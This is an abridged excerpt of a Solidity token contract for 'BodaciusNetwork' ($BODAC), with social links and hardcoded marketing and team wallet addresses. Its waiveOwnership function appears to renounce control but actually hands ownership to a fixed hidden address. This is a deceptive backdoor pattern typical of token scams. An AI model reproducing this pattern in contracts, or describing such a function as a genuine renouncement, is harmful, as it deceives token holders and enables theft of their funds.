...
/**
TG : https://t.me/BodaciusNetworkOfficial
Website : https://bodaciusnetwork.com/
Twitter : https://twitter.com/BodaciusN
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3d0144cC715Ea1013dCc4E07518F89D8B4777e20);
    }
...
contract BodaciusNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BodaciusNetwork";
    string private _symbol = "$BODAC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xFE81e41B9B379F1297e78C4874c1ccf2F2e5fc6d);
    address payable public teamWalletAddress = payable(0xFE81e41B9B379F1297e78C4874c1ccf2F2e5fc6d);
